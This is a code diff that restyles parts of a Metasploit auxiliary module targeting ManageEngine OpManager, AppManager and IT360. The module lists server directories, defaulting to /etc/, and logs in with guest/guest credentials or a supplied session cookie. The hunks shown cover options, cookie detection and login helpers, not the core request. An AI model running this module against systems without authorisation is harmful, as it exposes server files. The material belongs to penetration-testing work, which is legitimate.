@@ -44,17 +44,12 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('TARGETURI',
-          [ true, "The base path to OpManager, AppManager or IT360", '/' ]),
-        OptString.new('DIRECTORY', [false, 'Path of the directory to list', '/etc/']),
-        OptString.new('IAMAGENTTICKET',
-          [false, 'Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)']),
-        OptString.new('USERNAME',
-          [true, 'The username to login as (IT360 target only)', 'guest']),
-        OptString.new('PASSWORD',
-          [true, 'Password for the specified username (IT360 target only)', 'guest']),
-        OptString.new('DOMAIN_NAME',
-          [false, 'Name of the domain to logon to (IT360 target only)'])
+        OptString.new('TARGETURI', [true, "The base path to OpManager, AppManager or IT360", '/']),
+        OptString.new('DIRECTORY', [true, 'Path of the directory to list', '/etc/']),
+        OptString.new('IAMAGENTTICKET', [false, 'Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)']),
+        OptString.new('USERNAME', [true, 'The username to login as (IT360 target only)', 'guest']),
+        OptString.new('PASSWORD', [true, 'Password for the specified username (IT360 target only)', 'guest']),
+        OptString.new('DOMAIN_NAME', [false, 'Name of the domain to logon to (IT360 target only)'])
       ], self.class)
   end
 
@@ -64,30 +59,33 @@ class Metasploit3 < Msf::Auxiliary
       'method' => 'GET',
       'uri' => normalize_uri(datastore['TARGETURI'])
     })
+
     if res
       return res.get_cookies
     end
   end
 
-
   def detect_it360
     res = send_request_cgi({
-      'uri'    => "/",
+      'uri'    => '/',
       'method' => 'GET'
     })
+
     if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/
       return true
     end
+
     return false
   end
-
 
   def get_it360_cookie_name
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri("/"),
+      'uri' => normalize_uri('/')
     })
+
     cookie = res.get_cookies
+
     if cookie =~ /IAMAGENTTICKET([A-Z]{0,4})/
       return $1
     else
@@ -95,21 +93,19 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-
-
   def authenticate_it360(port, path, username, password)
-    if datastore['DOMAIN_NAME'] == nil
+    if datastore['DOMAIN_NAME'].nil?
       vars_post = {
-          'LOGIN_ID' => username,
-          'PASSWORD' => password,
-          'isADEnabled' => "false"
+        'LOGIN_ID' => username,
+        'PASSWORD' => password,
+        'isADEnabled' => 'false'
       }
     else
       vars_post = {
-          'LOGIN_ID' => username,
-          'PASSWORD' => password,
-          'isADEnabled' => "true",
-          'domainName' => datastore['DOMAIN_NAME']
+        'LOGIN_ID' => username,
+        'PASSWORD' => password,
+        'isADEnabled' => 'true',
+        'domainName' => datastore['DOMAIN_NAME']
       }
     end
 
@@ -140,16 +136,16 @@ class Metasploit3 < Msf::Auxiliary
 
   def login_it360
     # Do we already have a valid cookie? If yes, just return that.
-    if datastore['IAMAGENTTICKET'] != nil
+    unless datastore['IAMAGENTTICKET'].nil?
       cookie_name = get_it360_cookie_name
-      cookie = "IAMAGENTTICKET" + cookie_name + "=" + datastore['IAMAGENTTICKET'] + ";"
+      cookie = 'IAMAGENTTICKET' + cookie_name + '=' + datastore['IAMAGENTTICKET'] + ';'
       return cookie
     end
 
     # get the correct path, host and port
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri("/"),
+      'uri' => normalize_uri('/')
     })
 
     if res && res.redirect?
@@ -177,11 +173,10 @@ class Metasploit3 < Msf::Auxiliary
     return nil
   end
 
-
   def run
     # No point to continue if directory is not specified
-    if datastore['DIRECTORY'].nil? || datastore['DIRECTORY'].empty?
-      print_error("Please supply the path of the directory you want to list.")
+    if datastore['DIRECTORY'].empty?
+      print_error('Please supply the path of the directory you want to list.')
       return
     end
 
